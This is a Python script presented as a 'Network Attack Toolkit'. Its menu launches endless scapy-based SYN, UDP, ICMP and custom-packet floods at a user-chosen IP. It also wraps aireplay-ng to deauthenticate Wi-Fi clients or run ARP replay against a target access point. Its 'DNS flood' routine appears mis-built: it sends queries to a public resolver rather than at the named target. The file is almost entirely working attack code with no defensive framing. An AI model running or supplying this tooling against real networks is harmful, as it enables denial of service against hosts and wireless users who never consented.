Python

#!/usr/bin/env python3

import os
import sys
import random
import subprocess
from scapy.all import *
from time import sleep

RED = '\033[31m'
GREEN = '\033[32m'
CYAN = '\033[36m'
BRIGHT_WHITE = '\033[97m'
RESET = '\033[0m'

def print_banner():
    os.system('clear')
    print(f"""{GREEN}
    ███████╗██╗   ██╗██╗███╗   ███╗
    ██╔════╝██║   ██║██║████╗ ████║
    ███████╗██║   ██║██║██╔████╔██║
    ╚════██║██║   ██║██║██║╚██╔╝██║
    ███████║╚██████╔╝██║██║ ╚═╝ ██║
    ╚══════╝ ╚═════╝ ╚═╝╚═╝     ╚═╝
    """)
    print(f"{CYAN}        Network Attack Toolkit{RESET}")

def syn_flood(target_ip, target_port):
    print(f"{GREEN}[*] Starting SYN Flood on {target_ip}:{target_port}{RESET}")
    while True:
        src_port = random.randint(1024, 65535)
        ip = IP(dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        pkt = ip / tcp
        send(pkt, verbose=0)

def udp_flood(target_ip, target_port):
    print(f"{GREEN}[*] Starting UDP Flood on {target_ip}:{target_port}{RESET}")
    while True:
        data = random._urandom(1024)
        send(IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=data), verbose=0)

def icmp_flood(target_ip):
    print(f"{GREEN}[*] Starting ICMP Flood on {target_ip}{RESET}")
    while True:
        send(IP(dst=target_ip)/ICMP(), verbose=0)

def dns_flood(target_ip, dns_server="8.8.8.8"):
    print(f"{GREEN}[*] Starting DNS Flood on {target_ip} via DNS server {dns_server}{RESET}")
    while True:
        pkt = IP(dst=dns_server)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1,qd=DNSQR(qname=target_ip))
        send(pkt, verbose=0)

def custom_packet_attack(target_ip, target_port, payload):
    print(f"{GREEN}[*] Starting Custom Packet Attack on {target_ip}:{target_port}{RESET}")
    while True:
        send(IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload), verbose=0)

def run_aireplay(interface, target_bssid, client_mac=None, attack_type="deauth", packets=100):
    try:
        if attack_type == "deauth":
            cmd = ["aireplay-ng", "--deauth", str(packets), "-a", target_bssid]
            if client_mac:
                cmd += ["-c", client_mac]
            cmd.append(interface)
        elif attack_type == "arp_replay":
            cmd = ["aireplay-ng", "-2", "-b", target_bssid, interface]
        else:
            print(f"{RED}[!] Unknown aireplay-ng attack type: {attack_type}{RESET}")
            return

        print(f"{GREEN}[*] Running: {' '.join(cmd)}{RESET}")
        subprocess.run(cmd)
    except FileNotFoundError:
        print(f"{RED}[!] aireplay-ng not found. Please install aircrack-ng.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error running aireplay-ng: {e}{RESET}")

def main_menu():
    while True:
        print_banner()
        print(f"{BRIGHT_WHITE}1. SYN Flood{RESET}")
        print(f"{BRIGHT_WHITE}2. UDP Flood{RESET}")
        print(f"{BRIGHT_WHITE}3. ICMP Flood{RESET}")
        print(f"{BRIGHT_WHITE}4. DNS Flood{RESET}")
        print(f"{BRIGHT_WHITE}5. Custom Packet Attack{RESET}")
        print(f"{BRIGHT_WHITE}10. Start Aireplay-ng Attack{RESET}")
        print(f"{BRIGHT_WHITE}0. Exit{RESET}")

        choice = input(f"{CYAN}Select an option: {RESET}")

        if choice == '1':
            target_ip = input("Target IP: ")
            target_port = int(input("Target Port: "))
            syn_flood(target_ip, target_port)

        elif choice == '2':
            target_ip = input("Target IP: ")
            target_port = int(input("Target Port: "))
            udp_flood(target_ip, target_port)

        elif choice == '3':
            target_ip = input("Target IP: ")
            icmp_flood(target_ip)

        elif choice == '4':
            target_ip = input("Target Hostname (DNS Query): ")
            dns_server = input("DNS Server (default 8.8.8.8): ") or "8.8.8.8"
            dns_flood(target_ip, dns_server)

        elif choice == '5':
            target_ip = input("Target IP: ")
            target_port = int(input("Target Port: "))
            payload = input("Custom Payload: ")
            custom_packet_attack(target_ip, target_port, payload)

        elif choice == '10':
            print(f"{GREEN}Aireplay-ng Attack Setup{RESET}")
            interface = input("Enter monitor mode interface (e.g., wlan0mon): ")
            target_bssid = input("Enter target BSSID (AP MAC): ")
            client_mac = input("Enter client MAC (optional, press Enter to skip): ").strip() or None
            attack_type = input("Select attack type - 'deauth' (default) or 'arp_replay': ").strip() or "deauth"
            try:
                packets = int(input("Enter number of packets (default 100): ") or "100")
            except ValueError:
                packets = 100
            run_aireplay(interface, target_bssid, client_mac, attack_type, packets)
            input(f"{GREEN}Press Enter to return to the menu.{RESET}")

        elif choice == '0':
            print(f"{GREEN}Exiting...{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid choice. Try again.{RESET}")
            sleep(2)

if __name__ == "__main__":
    main_menu()